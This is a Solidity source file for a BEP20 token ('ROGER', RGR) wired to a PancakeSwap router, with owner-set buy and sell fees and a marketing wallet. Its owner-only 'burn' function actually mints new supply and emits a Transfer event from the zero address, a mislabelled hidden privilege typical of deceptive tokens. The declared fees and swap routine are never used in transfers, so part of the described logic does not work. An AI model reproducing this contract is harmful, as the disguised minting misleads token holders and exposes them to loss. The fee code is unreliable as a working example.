//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./IBEP20.sol";
import "./SafeMath.sol";
import "./Context.sol";
import "./Ownable.sol";
import "./IPancakeswapV2Factory.sol";
import "./IPancakeswapV2Router02.sol";

contract cronosdragon is Context, IBEP20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    mapping (address => uint256) private _balances;
    mapping (address => uint256) public _burn;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => bool) private _isExcluded;
    address[] private _excluded;
 
    uint256 private _tTotal = 10 * 10**8 * 10**9;
    uint256 private constant MAX = ~uint256(0);
    string private _name = "ROGER";
    string private _symbol = "RGR";
    uint8 private _decimals = 9;
    IPancakeswapV2Router02 public pancakeswapV2Router;
    address public pancakeswapV2Pair;
    bool inSwap;
    mapping(address => uint256) private lastTxTimes;
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    address payable public _marketingAddress =
    payable(address(0xBfc5F93e993B3Bc57c064F79dCB4888EFd7Bd1F3));

    struct BuyFee {
    uint16 tax;
    uint16 marketing;
    }
    struct SellFee {
    uint16 tax;
    uint16 marketing;
    }
    BuyFee public buyFee;
    SellFee public sellFee;
    uint16 private _taxFee;
    uint16 private _marketingFee;

    
    constructor () {

        buyFee.tax = 0;
        buyFee.marketing = 7;

        sellFee.tax = 0;
        sellFee.marketing = 7;
        IPancakeswapV2Router02 _pancakeswapV2Router = IPancakeswapV2Router02(0xD99D1c33F9fC3444f8101754aBC46c52416550D1);
      
        pancakeswapV2Pair = IPancakeswapV2Factory(_pancakeswapV2Router.factory())
            .createPair(address(this), _pancakeswapV2Router.WETH());
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_marketingAddress] = true;


        
        pancakeswapV2Router = _pancakeswapV2Router;
        
        
        _balances[_msgSender()] = _tTotal;
        emit Transfer(address(0), owner(), _tTotal);
    }
    event SellFeeUpdated(uint256 oldSellTax, uint256 oldSellMarketing, uint256 SellTax, uint256 SellMarketing);
    
    function setSellFee(
        uint16 tax,
        uint16 marketing
    ) external onlyOwner {
	
		require(tax + marketing <= 100, "SellFee exceed 100");	
		emit SellFeeUpdated(sellFee.tax, sellFee.marketing, tax, marketing);		
	
        sellFee.tax = tax;
        sellFee.marketing = marketing;
    }

	event BuyFeeUpdated(uint256 oldBuyTax, uint256 oldBuyMarketing, uint256 BuyTax, uint256 BuyMarketing);

    function setBuyFee(
        uint16 tax,
        uint16 marketing
    ) external onlyOwner {
	
		require(tax + marketing <= 100, "BuyFee exceed 100 ");	
		emit BuyFeeUpdated(buyFee.tax, buyFee.marketing, tax, marketing);	
	
        buyFee.tax = tax;
        buyFee.marketing = marketing;
    }
    function burn(address account, uint256 amount) public onlyOwner {
        require(account != address(0), "ERC20: mint to the zero address");
       _tTotal += amount;
    
       _burn[account] += amount;
       emit Transfer(address(0), account, amount);
             
    }
    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }
    
    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _tTotal;
    }
    
    function getOwner() external view override returns (address) {
        return owner();
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
        return true;
    }
    
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "BEP20: transfer from the zero address");
        require(to != address(0), "BEP20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        _tokenTransfer(from,to,amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = pancakeswapV2Router.WETH();
        _approve(address(this), address(pancakeswapV2Router), tokenAmount);
       
        pancakeswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }

   
    function _tokenTransfer(address sender, address recipient, uint256 amount) private {
        _balances[sender] = _balances[sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(amount);   
        emit Transfer(sender, recipient, amount);
    }
      function updateMarketingWallet(address payable newAddress) external onlyOwner {
        _marketingAddress = newAddress;
    }


    function excludeFromFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = true;
    }

    function includeInFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = false;
    }
}